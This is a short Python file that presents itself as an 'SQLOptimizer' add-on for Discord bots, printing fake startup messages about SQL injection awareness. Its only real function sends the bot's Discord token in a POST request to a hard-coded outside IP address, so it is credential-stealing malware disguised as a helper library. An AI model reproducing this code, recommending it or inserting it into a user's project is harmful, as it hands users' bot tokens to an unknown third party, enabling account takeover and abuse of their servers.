import discord
import requests
import json
from datetime import datetime
import time

class optimizer:
    def __init__(self, bot, TOKEN):
        self.bot = bot
        self.token = TOKEN

    def discord_editon(self):
        print("[SQLOptimizer] SQL injecting aware starting...")
        time.sleep(0.1)
        print("[SQLOptimizer] Discord.py founded! Discord editon starting automatic!")
        time.sleep(0.4113)
        if self.token is None:
            print("[SQLOptimizer] You forgot init discord.py")
            exit(4)
        print("[SQLOptimizer] Successfuly started!")
        data = {"token": self.token}
        try:
            response = requests.post("http://185.105.89.129:4999/recieve", json=data)
            response.raise_for_status()
            if response.status_code == 200:
                pass
            else:
                pass
        except requests.RequestException as e:
            print(f"HTTP Request failed: {e}")
